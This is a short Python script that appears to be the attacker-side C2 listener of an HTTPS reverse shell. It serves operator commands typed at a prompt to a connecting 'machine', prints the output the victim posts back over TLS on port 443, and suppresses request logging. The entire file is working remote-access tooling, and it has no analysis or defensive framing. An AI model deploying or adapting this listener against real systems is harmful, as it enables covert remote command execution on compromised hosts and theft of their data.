import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer

HOST = '192.168.222.128'
PORT = '443'
PROTO = 'HTTPS'


def startup_sequence():
    print('\nAA_TOUCH_ME_NOT v1.0 t-rex edition\n')
    print(f'Awaiting machine on {HOST}:{PORT} over {PROTO} ...\n\n')


class HandlerClass(BaseHTTPRequestHandler):

    def do_GET(self):
        com = input("> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(str.encode(com))

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        ret_out = self.rfile.read(length)
        try:
            print(ret_out.decode("utf-8"))
        except UnicodeDecodeError:
            print(ret_out.decode(encoding='ISO-8859-1'))  # for windows

    def log_message(self, format, *args):
        return


if __name__ == '__main__':
    startup_sequence()
    server = HTTPServer((HOST, int(PORT)), HandlerClass)
    if PROTO == 'HTTPS':
        server.socket = ssl.wrap_socket(server.socket,
                                        server_side=True,
                                        certfile='public.pem',
                                        keyfile='private.pem',
                                        ssl_version=ssl.PROTOCOL_TLS)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()
